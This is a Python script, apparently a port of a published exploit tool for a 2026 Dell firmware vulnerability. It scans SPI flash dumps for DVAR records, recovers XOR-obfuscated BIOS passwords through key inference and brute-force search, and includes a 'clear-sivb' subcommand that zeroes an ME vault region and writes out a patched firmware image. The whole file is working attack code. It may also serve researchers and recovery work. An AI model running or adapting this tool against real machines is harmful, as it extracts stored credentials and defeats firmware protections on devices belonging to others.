#!/usr/bin/env python3
"""dellpwn DVAR+XOR password recovery — faithful Python port of
R3n5k1/dellpwn src/dvar.rs (CVE-2026-40639, AmberWolf + MDSec).

Scans Dell SPI flash dumps for the DVAR (Dell Variable) store and recovers
XOR-encrypted BIOS passwords: 32-byte field, 20-byte key, first char in the
clear; the key leaks from the null-padded tail and the wrap region.

Usage: python3 dellpwn_port.py <dump.bin> [--partial] [--all-dvar]
"""
import sys
from collections import Counter

OBFUSCATION_MASKS = [0x08, 0x10, 0x18, 0x20, 0x28, 0x40, 0x48]
ALLOWED_RESIDUALS = set([0] + OBFUSCATION_MASKS)
LETTER_FREQ = {c: f for c, f in zip("etaoinshrdlcumwfgypbvkjxqz",
    [127, 91, 82, 75, 70, 67, 63, 61, 60, 43, 40, 28, 28, 24, 24, 22, 20, 20, 19, 15, 10, 8, 2, 2, 1, 1])}
PASSWORD_EXTRA = set("!@#$%^&*()-_=+.,;:?/ ")

def is_printable(b): return 0x20 <= b < 0x7f
def is_alpha(b): return (0x41 <= b <= 0x5a) or (0x61 <= b <= 0x7a)
def is_password_char(b):
    if (0x30 <= b <= 0x39) or (0x41 <= b <= 0x5a) or (0x61 <= b <= 0x7a):
        return True
    return b in PASSWORD_EXTRA or b == 0x20
def letter_freq(ch):
    return LETTER_FREQ.get(ch.to_ascii_lowercase() if hasattr(ch, "to_ascii_lowercase") else ch.lower(), 0) if isinstance(ch, str) else LETTER_FREQ.get(chr(ch).lower(), 0)

def recover_password_short(stored):
    b0 = stored[0]
    if not is_printable(b0): return None
    key = [0] * 20
    for i in range(21, 32):
        key[(i - 1) % 20] = stored[i]
    decrypted = [0] * 32
    decrypted[0] = b0
    for i in range(1, 12):
        decrypted[i] = stored[i] ^ key[(i - 1) % 20]
    pwd_len = 12
    for i in range(12):
        if decrypted[i] == 0:
            pwd_len = i; break
        if not is_printable(decrypted[i]):
            if decrypted[i] in OBFUSCATION_MASKS:
                pwd_len = i; break
            return None
    if pwd_len < 1: return None
    if pwd_len <= 20:
        for i in range(pwd_len, 21):
            key[(i - 1) % 20] = stored[i]
    wrap_mismatches = 0
    if pwd_len < 11:
        for k in range(pwd_len, 11):
            if stored[k + 1] != key[k]: wrap_mismatches += 1
    for i in range(21, 32):
        ki = (i - 1) % 20
        if stored[i] != key[ki]: wrap_mismatches += 1
    if wrap_mismatches > 5: return None
    for i in range(1, 32):
        decrypted[i] = stored[i] ^ key[(i - 1) % 20]
    pwd_len = 32
    for i in range(32):
        if decrypted[i] == 0:
            pwd_len = i; break
        if not is_printable(decrypted[i]): return None
    if pwd_len < 1 or pwd_len > 20: return None
    null_nonzero = sum(1 for i in range(pwd_len + 1, 32) if decrypted[i] != 0)
    if null_nonzero > 5: return None
    return bytes(decrypted[:pwd_len]).decode("latin-1"), bytes(key)

def try_uniform_password(stored):
    c = stored[0]
    key = [stored[j + 1] ^ c for j in range(20)]
    for j in range(11):
        if (stored[j + 21] ^ key[j]) != c: return None
    if sum(1 for b in key if b == c) > 3: return None
    if len(set(key)) < 18: return None
    return chr(c) * 32, bytes(key)

def validate_and_return(stored, key, target_len):
    decrypted = [0] * 32
    decrypted[0] = stored[0]
    for i in range(1, 32):
        decrypted[i] = stored[i] ^ key[(i - 1) % 20]
    for i in range(target_len):
        if not is_printable(decrypted[i]): return None
    if target_len < 32:
        for i in range(target_len, 32):
            if decrypted[i] != 0: return None
    return bytes(decrypted[:target_len]).decode("latin-1"), bytes(key)

def partial_recovery(stored, key, known, target_len):
    password = [chr(stored[0])]
    for i in range(1, target_len):
        ki = (i - 1) % 20
        if ki in known:
            ch = stored[i] ^ key[ki]
            if 0x20 <= ch <= 0x7e: password.append(chr(ch))
            else: return None
        else:
            password.append("?")
    for i in range(target_len, 32):
        ki = (i - 1) % 20
        if ki in known and (stored[i] ^ key[ki]) != 0: return None
    partial = "".join(password)
    if partial.count("?") >= len(partial) - 2: return None
    return partial, bytes(key)

def _key_candidates(stored, j, target_len):
    pos1, pos2 = j + 1, j + 21
    cands = []
    for kv in range(256):
        d1 = stored[pos1] ^ kv
        if pos1 < target_len:
            if not is_printable(d1): continue
        elif d1 != 0: continue
        if pos2 < 32:
            d2 = stored[pos2] ^ kv
            if pos2 < target_len:
                if not is_printable(d2): continue
            elif d2 != 0: continue
        cands.append(kv)
    return cands

def try_long_password(stored, target_len):
    key = [0] * 20
    known = set()
    for i in range(target_len, 32):
        ki = (i - 1) % 20
        if ki in known and key[ki] != stored[i]: return None
        key[ki] = stored[i]; known.add(ki)
    for j in range(20):
        if j in known: continue
        cands = _key_candidates(stored, j, target_len)
        if not cands: return None
        if len(cands) == 1:
            key[j] = cands[0]; known.add(j)
    unknown_multi = [j for j in range(20) if j not in known]
    if not unknown_multi:
        return validate_and_return(stored, key, target_len)
    candidate_lists = []
    for j in unknown_multi:
        cands = _key_candidates(stored, j, target_len)
        if not cands: return None
        candidate_lists.append(cands)
    total = 1
    for cl in candidate_lists:
        total *= len(cl)
        if total > 5_000_000:
            if len(known) >= 8:
                return partial_recovery(stored, key, known, target_len)
            return None
    indices = [0] * len(unknown_multi)
    while True:
        trial = key[:]
        for idx, j in enumerate(unknown_multi):
            trial[j] = candidate_lists[idx][indices[idx]]
        r = validate_and_return(stored, trial, target_len)
        if r: return r
        carry = True
        for i in range(len(indices) - 1, -1, -1):
            if carry:
                indices[i] += 1
                if indices[i] < len(candidate_lists[i]): carry = False
                else: indices[i] = 0
        if carry: break
    return None

def recover_password_long(stored):
    if not is_printable(stored[0]): return None
    all_pairs_valid = all((stored[j + 1] ^ stored[j + 21]) <= 0x5E for j in range(11))
    if all_pairs_valid:
        r = try_uniform_password(stored)
        if r: return r
    for target_len in range(21, 25):
        r = try_long_password(stored, target_len)
        if r: return r
    return None

def correct_dvar_obfuscation(stored, password, key):
    pwd_len = len(password)
    if pwd_len >= 11 or pwd_len < 2: return password, key
    has_obf = any(stored[i] != key[(i - 1) % 20] for i in range(21, 32))
    if not has_obf: return password, key
    wrap_only_end = min(pwd_len - 1, 11)
    wrap_only = list(range(wrap_only_end))
    if not wrap_only: return password, key
    orig_key = bytearray(key); corrected = bytearray(key)
    for ki in wrap_only:
        pos = ki + 1
        orig_char = stored[pos] ^ orig_key[ki]
        orig_al = is_alpha(orig_char)
        orig_fr = LETTER_FREQ.get(chr(orig_char).lower(), 0) if orig_al else 0
        cands = []
        for mask in OBFUSCATION_MASKS:
            nk = orig_key[ki] ^ mask
            nc = stored[pos] ^ nk
            if not is_printable(nc): continue
            wp = ki + 21
            if wp < 32 and (stored[wp] ^ nk) not in ALLOWED_RESIDUALS: continue
            if not is_alpha(nc): continue
            cands.append((mask, nc, LETTER_FREQ.get(chr(nc).lower(), 0)))
        if not cands: continue
        best = max(cands, key=lambda x: x[2])  # first-wins on ties approx
        if not is_password_char(orig_char):
            corrected[ki] = orig_key[ki] ^ best[0]
        elif orig_al and best[2] > orig_fr * 5:
            corrected[ki] = orig_key[ki] ^ best[0]
    corrected_first = stored[0]
    if not is_password_char(corrected_first):
        best_f = 0
        for mask in OBFUSCATION_MASKS:
            cand = corrected_first ^ mask
            if is_alpha(cand):
                f = LETTER_FREQ.get(chr(cand).lower(), 0)
                if f > best_f: best_f = f; corrected_first = cand
    dec = [corrected_first] + [stored[j] ^ corrected[(j - 1) % 20] for j in range(1, 32)]
    new_pw = bytes(dec[:pwd_len]).decode("latin-1")
    return (new_pw, bytes(corrected)) if new_pw != password else (password, key)

def recover_password_from_record(stored):
    short = recover_password_short(stored)
    long_ = recover_password_long(stored)
    if long_ and (not short or len(long_[0]) > len(short[0])):
        return long_
    if short:
        return correct_dvar_obfuscation(stored, short[0], short[1])
    return None

def scan_for_passwords(data, start, end, include_partial=False):
    results = []
    skip_until = 0
    scan_end = min(end, len(data) - 32)
    offset = start
    while offset < scan_end:
        if offset < skip_until:
            offset += 1; continue
        record = data[offset:offset + 32]
        rec = recover_password_from_record(record)
        if rec:
            password, key = rec
            is_partial = "?" in password
            if is_partial:
                if not include_partial or len(password) < 10:
                    offset += 1; continue
                known = sum(1 for c in password if c != "?")
                if known < 8: offset += 1; continue
                nz = len({b for b in key if b != 0})
                if nz < 4: offset += 1; continue
            else:
                if len(set(key)) < 8: offset += 1; continue
                if key.count(0) > 2: offset += 1; continue
                counts = Counter(key)
                if max(counts.values()) > 3: offset += 1; continue
                if sum(1 for b in key if is_printable(b)) > 12: offset += 1; continue
                if sum(1 for b in key if b <= 0x0f) > 6: offset += 1; continue
                tail = data[offset + 1:offset + 32]
                if tail.count(0) > 4: offset += 1; continue
                if len(password) <= 20:
                    wrap_errors = sum(1 for i in range(21, 32)
                                      if record[i] != key[(i - 1) % 20])
                    if wrap_errors > min(len(password) // 2 + 1, 5):
                        offset += 1; continue
            if len(password) < 3:
                offset += 1; continue
            results.append((offset, password, key.hex(), is_partial))
            skip_until = offset + 32
        offset += 1
    return results

def main():
    if len(sys.argv) >= 2 and sys.argv[1] == "clear-sivb":
        if len(sys.argv) < 4:
            print("usage: dellpwn_port.py clear-sivb <in.bin> <out.bin> [--full]")
            return
        cmd_clear_sivb(sys.argv[2], sys.argv[3], full=("--full" in sys.argv)); return
    path = sys.argv[1]
    include_partial = "--partial" in sys.argv
    data = open(path, "rb").read()
    print(f"File: {path} ({len(data):,} bytes)")
    # find ALL DVAR regions (the Rust tool scans only the first; we scan every occurrence)
    regions = []
    pos = 0
    while True:
        i = data.find(b"DVAR", pos)
        if i < 0: break
        regions.append(i); pos = i + 4
    print(f"DVAR occurrences: {len(regions)} at {[hex(r) for r in regions[:6]]}")
    total = 0
    seen = set()
    for r in regions:
        end = min(r + 0x40000, len(data))
        for offset, password, keyhex, partial in scan_for_passwords(data, r, end, include_partial):
            if password in seen: continue
            seen.add(password)
            total += 1
            print(f"  PASSWORD @0x{offset:06x}: {password!r}  key=0x{keyhex}{'  [partial]' if partial else ''}")
    # also scan the whole NVRAM/settings band 0x1000000-0x2100000 on 32MB images for stray records
    if len(data) > 0x2100000:
        for offset, password, keyhex, partial in scan_for_passwords(data, 0x1000000, 0x2100000, include_partial):
            if password in seen: continue
            seen.add(password)
            total += 1
            print(f"  PASSWORD(nvram) @0x{offset:06x}: {password!r}  key=0x{keyhex}{'  [partial]' if partial else ''}")
    if not total:
        print("No passwords found in DVAR regions.")

# ---- clear-sivb subcommand (vault rollback, R3n5k1/dellpwn semantics) ----
def cmd_clear_sivb(src, dst, full=False):
    import struct as _s
    data = bytearray(open(src, "rb").read())
    blocks = []
    for i in range(len(data) - 5552):
        if data[i:i+4] == b"SIVB" and i >= 4:
            hs = _s.unpack_from("<H", data, i-4)[0]
            if hs == 0x20:
                blocks.append(i-4)
    if not blocks:
        print("No SIVB blocks found — nothing to clear."); return
    for off in blocks:
        nontrivial = sum(1 for b in data[off+4:off+5552] if b not in (0, 0xFF))
        if nontrivial > 10:
            # §11.20 vault-extent safety: the SIVB vault lives in a 16KB
            # (0x4000) ME partition (IVBP). Live vault data has been measured
            # to +0x26ef (3090) / +0x13c0+status-block (3410), i.e. beyond the
            # legacy 5552-byte window but ALWAYS inside the 16KB partition.
            # Past +0x4000 comes the NEXT ME structure (MFS file headers,
            # magic 87 78 55 AA) — never touch those.
            # Default: the field-validated 5552B rollback (§11.15).
            # --full: zero the entire 16KB vault partition.
            if full:
                end = off + 0x4000
                span = 0x4000
            else:
                end = off + 5552
                span = 5552
            data[off:end] = b"\x00" * span
            print(f"Cleared SIVB @0x{off:06x} ({span} bytes zeroed"
                  f"{' — FULL 16KB partition' if full else ' — validated range'}; "
                  f"{nontrivial} non-trivial bytes were in legacy window)")
        else:
            print(f"SIVB @0x{off:06x}: already empty")
    open(dst, "wb").write(data)
    print(f"Patched image written: {dst} ({len(data):,} bytes)")


if __name__ == "__main__":
    main()
